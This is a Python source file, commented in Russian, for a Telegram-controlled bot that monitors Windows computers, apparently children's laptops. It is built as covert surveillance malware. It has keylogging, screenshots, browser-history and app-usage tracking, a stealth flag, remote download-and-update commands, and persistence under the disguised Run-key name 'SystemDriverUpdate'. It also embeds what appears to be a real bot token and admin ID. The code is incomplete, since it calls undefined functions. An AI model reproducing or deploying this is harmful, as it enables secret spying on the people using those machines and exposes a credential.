# multi_device_bot.py
"""
Мульти-устройство бот (устаревший, сохранен для совместимости)
Используйте main_bot.py и watchdog.py вместо этого файла
"""

import telebot
import os
import sys
import time
import subprocess
import threading
import pyautogui
import psutil
import tkinter as tk
import winreg as reg
from telebot import types
import ctypes
import zipfile
import urllib.request
import socket
import keyboard
import io
import shutil
import json
import sqlite3
from datetime import datetime, timedelta
import matplotlib.pyplot as plt
import matplotlib.dates as mdates
from collections import defaultdict, Counter
import requests
from urllib.parse import urlparse
import re

# --- КОНФИГУРАЦИЯ ---
CONFIG_FILE = "config.json"
BOT_VERSION = "13.0 (Advanced Control)"
DATABASE_FILE = "bot_data.db"

# Новые глобальные переменные
STEALTH_MODE = False
SCREENSHOT_INTERVAL = 0  # 0 = выключено
SCREENSHOT_THREAD = None
BLOCK_END_TIME = None
WEB_HISTORY = []
APP_USAGE_STATS = defaultdict(int)
DAILY_STATS = defaultdict(int)
START_TIME = time.time()

# Загрузка конфигурации
def load_config():
    try:
        with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        # Создаем дефолтную конфигурацию если файла нет
        default_config = {
            "devices": {
                "default": {
                    "api_token": "8471615293:AAEqbsdNG2KTVZE5pDVCDDwZAzVlOQ4z-iU",
                    "admin_id": 6219146434,
                    "device_name": socket.gethostname(),
                    "description": "Устройство по умолчанию"
                }
            },
            "current_device": "default"
        }
        save_config(default_config)
        return default_config

def save_config(config):
    try:
        with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
            json.dump(config, f, ensure_ascii=False, indent=2)
        return True
    except:
        return False

def get_device_config():
    config = load_config()
    current_device = config.get("current_device", "default")
    return config["devices"].get(current_device, config["devices"]["default"])

# Инициализация с конфигурацией
device_config = get_device_config()
API_TOKEN = device_config["api_token"]
ADMIN_ID = device_config["admin_id"]
DEVICE_NAME_CONFIG = device_config["device_name"]

print(f"--- ЗАПУСК БОТА {BOT_VERSION} ---")
print(f"Устройство: {DEVICE_NAME_CONFIG}")
print(f"API Token: {API_TOKEN[:10]}...")

try:
    bot = telebot.TeleBot(API_TOKEN)
except Exception as e:
    print(f"Ошибка инициализации: {e}")
    sys.exit(1)

# Глобальные переменные
LOCK_WINDOW = None
REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
REG_NAME = "SystemDriverUpdate"
REG_NAME_KEY = "DeviceFriendlyName"
KEYLOG_BUFFER = []
MAX_BUFFER_SIZE = 50000

# --- БАЗА ДАННЫХ ---

def init_database():
    """Инициализация базы данных для хранения статистики"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        # Таблица для истории браузера
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS web_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                url TEXT,
                title TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                device_id TEXT
            )
        ''')
        
        # Таблица для статистики приложений
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS app_usage (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                app_name TEXT,
                duration INTEGER,
                date DATE,
                device_id TEXT
            )
        ''')
        
        # Таблица для скриншотов
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS screenshots (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                filename TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                device_id TEXT
            )
        ''')
        
        # Таблица для активности
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS activity_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                activity_type TEXT,
                details TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                device_id TEXT
            )
        ''')
        
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        print(f"Ошибка инициализации БД: {e}")
        return False

def log_activity(activity_type, details=""):
    """Логирование активности в базу данных"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        device_id = get_current_device_id()
        
        cursor.execute('''
            INSERT INTO activity_log (activity_type, details, device_id)
            VALUES (?, ?, ?)
        ''', (activity_type, details, device_id))
        
        conn.commit()
        conn.close()
    except:
        pass

def save_web_history(url, title=""):
    """Сохранение истории браузера"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        device_id = get_current_device_id()
        
        cursor.execute('''
            INSERT INTO web_history (url, title, device_id)
            VALUES (?, ?, ?)
        ''', (url, title, device_id))
        
        conn.commit()
        conn.close()
    except:
        pass

def save_app_usage(app_name, duration):
    """Сохранение статистики использования приложений"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        device_id = get_current_device_id()
        today = datetime.now().date()
        
        cursor.execute('''
            INSERT OR REPLACE INTO app_usage (app_name, duration, date, device_id)
            VALUES (?, ?, ?, ?)
        ''', (app_name, duration, today, device_id))
        
        conn.commit()
        conn.close()
    except:
        pass

def get_device_name():
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, REG_PATH, 0, reg.KEY_READ)
        try:
            name, _ = reg.QueryValueEx(key, REG_NAME_KEY)
            reg.CloseKey(key)
            return str(name)
        except FileNotFoundError:
            reg.CloseKey(key)
    except:
        pass
    return DEVICE_NAME_CONFIG

def set_device_name_reg(new_name):
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, REG_PATH, 0, reg.KEY_ALL_ACCESS)
        reg.SetValueEx(key, REG_NAME_KEY, 0, reg.REG_SZ, str(new_name))
        reg.CloseKey(key)
        return True
    except:
        return False

def escape_html(text):
    return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

def is_admin(message):
    return message.from_user.id == ADMIN_ID

# --- НОВЫЕ ФУНКЦИИ ДЛЯ УПРАВЛЕНИЯ КОНФИГУРАЦИЕЙ ---

def switch_device_config(device_id):
    """Переключение на другое устройство"""
    config = load_config()
    if device_id in config["devices"]:
        config["current_device"] = device_id
        save_config(config)
        return True
    return False

def add_device_config(device_id, api_token, admin_id, device_name, description=""):
    """Добавление нового устройства в конфигурацию"""
    config = load_config()
    config["devices"][device_id] = {
        "api_token": api_token,
        "admin_id": admin_id,
        "device_name": device_name,
        "description": description
    }
    save_config(config)
    return True

def list_devices():
    """Получение списка всех устройств"""
    config = load_config()
    return config["devices"]

def get_current_device_id():
    """Получение ID текущего устройства"""
    config = load_config()
    return config.get("current_device", "default")

# --- КОМАНДЫ ДЛЯ УПРАВЛЕНИЯ УСТРОЙСТВАМИ ---

@bot.message_handler(commands=['devices'])
def list_devices_cmd(message):
    if not is_admin(message): return
    
    devices = list_devices()
    current_id = get_current_device_id()
    
    text = "📱 <b>Список устройств:</b>\n\n"
    for device_id, device_info in devices.items():
        status = "🟢 АКТИВНО" if device_id == current_id else "⚪"
        text += f"{status} <b>{device_id}</b>\n"
        text += f"   📝 {device_info['device_name']}\n"
        text += f"   🔑 {device_info['api_token'][:10]}...\n"
        if device_info.get('description'):
            text += f"   💬 {device_info['description']}\n"
        text += "\n"
    
    text += f"<b>Текущее:</b> {current_id}\n"
    text += "\n<b>Команды:</b>\n"
    text += "/switch_device &lt;id&gt; - Переключиться\n"
    text += "/add_device - Добавить устройство"
    
    bot.reply_to(message, text, parse_mode='HTML')

@bot.message_handler(commands=['switch_device'])
def switch_device_cmd(message):
    if not is_admin(message): return
    
    try:
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            bot.reply_to(message, "⚠️ Укажите ID устройства.\nПример: <code>/switch_device child2</code>", parse_mode='HTML')
            return
        
        device_id = args[1].strip()
        devices = list_devices()
        
        if device_id not in devices:
            bot.reply_to(message, f"❌ Устройство '{device_id}' не найдено.\nИспользуйте /devices для просмотра списка.", parse_mode='HTML')
            return
        
        if switch_device_config(device_id):
            device_info = devices[device_id]
            bot.reply_to(message, f"✅ Переключено на: <b>{device_info['device_name']}</b>\n🔄 Требуется перезапуск бота.", parse_mode='HTML')
        else:
            bot.reply_to(message, "❌ Ошибка переключения устройства.")
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {e}")

@bot.message_handler(commands=['add_device'])
def add_device_cmd(message):
    if not is_admin(message): return
    
    bot.reply_to(message, "📝 Введите данные устройства в формате:\n<code>ID|API_TOKEN|DEVICE_NAME|DESCRIPTION</code>\n\nПример:\n<code>child2|123456:ABC|Ноутбук Маши|Второй ребенок</code>", parse_mode='HTML')
    bot.register_next_step_handler(message, process_add_device)

def process_add_device(message):
    if not is_admin(message): return
    
    try:
        parts = message.text.split('|')
        if len(parts) < 3:
            bot.reply_to(message, "❌ Неверный формат. Нужно минимум: ID|TOKEN|NAME")
            return
        
        device_id = parts[0].strip()
        api_token = parts[1].strip()
        device_name = parts[2].strip()
        description = parts[3].strip() if len(parts) > 3 else ""
        
        if add_device_config(device_id, api_token, ADMIN_ID, device_name, description):
            bot.reply_to(message, f"✅ Устройство <b>{device_name}</b> добавлено!\nID: <code>{device_id}</code>", parse_mode='HTML')
        else:
            bot.reply_to(message, "❌ Ошибка добавления устройства.")
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {e}")

# --- ОБНОВЛЕННАЯ КОМАНДА UPDATE_URL ---

@bot.message_handler(commands=['update_url'])
def update_via_link(message):
    if not is_admin(message): return
    try:
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            bot.reply_to(message, "⚠️ Укажите URL для обновления.\nПример: <code>/update_url https://example.com/bot.exe</code>", parse_mode='HTML')
            return
            
        url = args[1].strip()
        name = escape_html(get_device_name())
        bot.reply_to(message, f"⬇️ <b>{name}</b>: Качаю обновление...\n🔄 Конфигурация будет сохранена", parse_mode='HTML')
        threading.Thread(target=download_from_url, args=(url, message)).start()
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {e}")

# --- ОБНОВЛЕННАЯ КОМАНДА МАССОВОГО ОБНОВЛЕНИЯ ---

@bot.message_handler(commands=['update_all'])
def update_all_devices(message):
    if not is_admin(message): return
    
    try:
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            bot.reply_to(message, "⚠️ Укажите URL для массового обновления.\nПример: <code>/update_all https://example.com/bot.exe</code>", parse_mode='HTML')
            return
            
        url = args[1].strip()
        devices = list_devices()
        
        text = f"🔄 <b>Массовое обновление</b>\n"
        text += f"📎 URL: <code>{url}</code>\n"
        text += f"📱 Устройств: {len(devices)}\n\n"
        text += "Это обновит ВСЕ устройства в конфигурации.\n"
        text += "Напишите <code>CONFIRM</code> для продолжения."
        
        msg = bot.reply_to(message, text, parse_mode='HTML')
        bot.register_next_step_handler(msg, lambda m: process_mass_update(m, url))
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {e}")

def process_mass_update(message, url):
    if not is_admin(message): return
    
    if message.text.strip() != "CONFIRM":
        bot.reply_to(message, "❌ Массовое обновление отменено.")
        return
    
    try:
        # Создаем скрипт для массового обновления
        devices = list_devices()
        
        script_content = f"""@echo off
echo Массовое обновление устройств...
echo URL: {url}
echo Устройств: {len(devices)}
echo.

"""
        
        for device_id, device_info in devices.items():
            script_content += f"""echo Обновление {device_id} ({device_info['device_name']})...
echo {{"current_device": "{device_id}"}} > temp_config.json
start /wait "" "{sys.executable}" update_single.py "{url}"
timeout /t 2 /nobreak >nul

"""
        
        script_content += """echo Массовое обновление завершено!
pause
"""
        
        with open("mass_update.bat", "w", encoding='cp1251') as f:
            f.write(script_content)
        
        bot.reply_to(message, "✅ Скрипт массового обновления создан: <code>mass_update.bat</code>\n⚠️ Запустите его вручную для обновления всех устройств.", parse_mode='HTML')
        
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка создания скрипта: {e}")

# Остальные функции остаются такими же...
# (Копирую основные функции из оригинального бота)

def logic_send_info(chat_id):
    uptime = time.time() - psutil.boot_time()
    uptime_h = int(uptime // 3600)
    name = escape_html(get_device_name())
    current_device = get_current_device_id()
    text = (f"👋 <b>{name}</b> на связи!\n"
            f"🆔 ID: <code>{current_device}</code>\n"
            f"ℹ️ Версия: <code>{BOT_VERSION}</code>\n"
            f"⏱ Аптайм: {uptime_h}ч\n"
            f"🔒 Блок: {'🔴 ДА' if LOCK_WINDOW else '🟢 Нет'}")
    bot.send_message(chat_id, text, parse_mode='HTML')

# Добавляем остальные функции из оригинального бота...
# (Для краткости показываю только ключевые изменения)

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if not is_admin(message): return
    add_to_startup()
    name = escape_html(get_device_name())
    current_device = get_current_device_id()
    text = (f"🤖 <b>Устройство: {name}</b>\n"
            f"🆔 ID: <code>{current_device}</code>\n"
            f"ℹ️ Версия: <code>{BOT_VERSION}</code>\n\n"
            "<b>Основные:</b>\n"
            "/panel - 🎛 Главная панель\n"
            "/info - Статус\n"
            "/devices - 📱 Управление устройствами\n"
            "/stop - 🛑 Стоп\n\n"
            "<b>Управление устройствами:</b>\n"
            "/devices - Список устройств\n"
            "/switch_device &lt;id&gt; - Переключить\n"
            "/add_device - Добавить устройство\n"
            "/update_all &lt;url&gt; - Массовое обновление\n\n"
            "<b>Остальные команды:</b>\n"
            "/lock - Блок | /unlock - Разблок\n"
            "/screen - Скриншот\n"
            "/keyboard - Кейлог")
    bot.reply_to(message, text, parse_mode='HTML')

# Здесь нужно добавить все остальные функции из оригинального бота
# Для экономии места показываю только структуру

if __name__ == "__main__":
    add_to_startup()
    try:
        name = escape_html(get_device_name())
        current_device = get_current_device_id()
        bot.send_message(ADMIN_ID, f"🟢 <b>{name}</b> ({current_device}): Запущен!\nВерсия: <code>{BOT_VERSION}</code>", parse_mode='HTML')
    except:
        pass
    print("Мульти-устройство бот готов.")
    while True:
        try:
            bot.polling(none_stop=True, interval=2)
        except:
            time.sleep(5)